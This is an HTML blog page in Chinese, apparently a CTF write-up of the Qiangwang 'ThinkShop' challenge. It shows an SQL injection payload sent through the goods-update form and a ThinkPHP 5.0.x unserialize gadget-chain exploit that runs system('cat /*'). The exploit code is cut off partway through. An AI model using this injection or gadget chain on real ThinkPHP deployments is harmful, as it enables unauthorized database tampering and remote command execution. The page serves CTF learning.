@@ -1,0 +1,907 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="‍ 前言这里把强网的ThinkShop再抓出来好好说说，因为这应该算是比较有意思的题目了(没做出来当时(就第一题有思路了) )，这里先@datou爷，参考了他写的WP，我哭死咋这么强 ‍ ThinkShop给了镜像，直接查看源码 其实只要关注这些即可 ​ 登录发现是存在Admin的路由的，说明是需要登录的，因为给了docker所以直接去docker的mysql中去查看账号密码即可 ​ ‍ ​ 但是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF - 再谈强网ThinkShop">
+<meta property="og:url" content="https://zjackky.github.io/post/ctf-talking-about-the-strong-network-thinkshop-z1xtoji.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="‍ 前言这里把强网的ThinkShop再抓出来好好说说，因为这应该算是比较有意思的题目了(没做出来当时(就第一题有思路了) )，这里先@datou爷，参考了他写的WP，我哭死咋这么强 ‍ ThinkShop给了镜像，直接查看源码 其实只要关注这些即可 ​ 登录发现是存在Admin的路由的，说明是需要登录的，因为给了docker所以直接去docker的mysql中去查看账号密码即可 ​ ‍ ​ 但是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514229.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514545.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514642.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514761.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514596.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514695.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514886.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514136.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514311.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514413.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514507.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514665.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514154.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514752.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514951.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514113.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514214.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514747.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514843.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514093.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514188.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514277.png">
+<meta property="og:image" content="c:\Users\Zachariah.Jack\Desktop\tmp_wp_picture\202312281537864-17037490613704.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514530.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514855.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514954.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514048.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514148.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514247.png">
+<meta property="article:published_time" content="2023-12-28T07:07:45.000Z">
+<meta property="article:modified_time" content="2023-12-28T07:14:27.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514229.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CTF - 再谈强网ThinkShop - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"$","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF - 再谈强网ThinkShop"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-28 15:07" pubdate>
+          2023年12月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF - 再谈强网ThinkShop</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>‍</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里把强网的ThinkShop再抓出来好好说说，因为这应该算是比较有意思的题目了(<del>没做出来当时(就第一题有思路了)</del> )，这里先@datou爷，参考了他写的WP，我哭死咋这么强</p>
+<p>‍</p>
+<h1 id="ThinkShop"><a href="#ThinkShop" class="headerlink" title="ThinkShop"></a>ThinkShop</h1><p>给了镜像，直接查看源码</p>
+<p>其实只要关注这些即可</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514229.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>发现是存在Admin的路由的，说明是需要登录的，因为给了docker所以直接去docker的mysql中去查看账号密码即可</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514545.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514642.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>但是直接输入admin 123456死活登录不进去</p>
+<p>那就只能去查看登录逻辑了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514761.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$adminData</span> = <span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;admin&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">cache</span>(<span class="hljs-literal">true</span>, <span class="hljs-variable">$Expire</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-variable">$username</span>);<br></code></pre></td></tr></table></figure>
+
+<p>这段代码的意思就是从<code>admin</code>​表中通过<code>find</code>​方法查询<code>$username</code>​并且把查询的结果放入缓存当中，那么在这个地方我们就要注意了，TP的<code>find</code>​方法是有一些限制的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514596.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以也就解释了为什么一开始一直输入 admin 123456不可行原因</p>
+<p>‍</p>
+<h2 id="注入反序列化"><a href="#注入反序列化" class="headerlink" title="注入反序列化"></a>注入反序列化</h2><p>在登录成功之前其实我们也可以发现，在mysql中还存在一个表叫<code>goods</code>​</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514695.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现他的<code>data</code>​这个字段中的数据是很长的base64</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514886.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>一看就知道是序列化的base64的值，所以其实在这里就有暗示可能是要打反序列化了(但是我们如何把我们序列化的字节序列放入<code>data</code>​字段呢)</p>
+<p>‍</p>
+<p>在这里有一个小技巧，就是如果是TP的docker的话可以给他开启<code>debug</code>​模式然后并且把sql语句进行打印出来可以更好的查看sql语句的执行</p>
+<p>修改文件在： <code>/var/www/html/application/config.php</code>​  修改为<code>&#39;app_debug&#39;              =&gt; true</code>​</p>
+<p>‍</p>
+<p>那么我们继续想如何把我们的字节序列加入数据库当中的<code>data</code>​字段中呢，我们可以想到是sql注入，所以我们现在就要去找一个sql注入的点(其实他这里的参数都没有进行sql的过滤并且都是直接拼接的所以基本上都可以直接注入)但是又因为咱需要更新他的<code>data</code>​的内容所以直接从<code>update</code>​这个方法中去注入即可</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514136.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>可以在这里在docker当中加入<code>echo $sql;</code>​来查看sql语句，那么我们在哪里触发这个<code>updatedata</code>​ 呢，可以找到</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514311.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>然后再往上找</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514413.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>在往上找</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514507.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现是进行商品更新的地方，那么我们登录之后就可以看到商品登录的接口了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514665.png" srcset="/img/loading.gif" lazyload alt="image">然后我们增加多一个<code>key</code>​来进行注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">132</span><span class="hljs-operator">&amp;</span>name<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>price<span class="hljs-operator">=</span><span class="hljs-number">100.00</span><span class="hljs-operator">&amp;</span>on_sale_time<span class="hljs-operator">=</span><span class="hljs-number">2023</span><span class="hljs-number">-12</span><span class="hljs-number">-19</span>T11:<span class="hljs-number">11</span><span class="hljs-operator">&amp;</span>image<span class="hljs-operator">=</span>test<span class="hljs-operator">&amp;</span>data<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>data`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-string">&#x27;qqq&#x27;</span><span class="hljs-keyword">where</span>`id`<span class="hljs-operator">%</span><span class="hljs-number">3</span>D132<span class="hljs-operator">%</span><span class="hljs-number">23</span><span class="hljs-operator">=</span>test<br></code></pre></td></tr></table></figure>
+
+<p>这里有个要注意的点，在POST传参中如果要把我们的 <span style="font-weight: bold;" data-type="strong">&#x3D;</span> 写入到数据库中记得URL编码一下写成<code>%3D</code>​否则直接写 <span style="font-weight: bold;" data-type="strong">&#x3D;</span> 是不会当成sql语句的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514154.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么现在可以修改<code>data</code>​的值了就可以写入序列化的字符序列了</p>
+<p>那么其实分析到现在我们还没有找触发反序列化的入口在哪里，因为从sql当中知道是<code>Data</code>​字段，那么去找上传这个的参数的地方即可</p>
+<p>我们可以从<code>goods_edit.html</code>​中找到以下代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;3&quot;</span> <span class="hljs-attr">required</span>&gt;</span>&#123;php&#125;use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&#x27;data&#x27;])));&#123;/php&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>那么我们来看看这个<code>$goods[&#39;data&#39;]</code>​是否可控</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514752.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>仔细查看<code>markdownToArray</code>​方法，其实可以发现只要不是<code>markdown</code>​就没有啥操作了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514951.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>然后就是把我们传入的内容直接作为数组返回而已</p>
+<p>‍</p>
+<p>但是这里还有个小问题 就是从刚开始对<code>data</code>​数据的解密和以下代码可以发现，他的序列化的值还得多包一层数组来进行绕过</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312281514113.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>最后就是引用下文的5.0.x的反序列化文件并且通过数组包裹后的exp</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/119793016">ThinkPHP5.0.x 反序列化_5.0.21 thinkphp 反序列化-CSDN博客</a></p>
+<p>这里抄了一波大头爷的exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>)];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cat /*&#x27;</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span><br>    &#123;&#125;<br>&#125;<br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append[<span class="hljs-string">&#x27;jelly&#x27;</span>] = <span class="hljs-string">&#x27;getError&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-keyword">new</span> relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">relation</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">Query</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BelongsTo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span 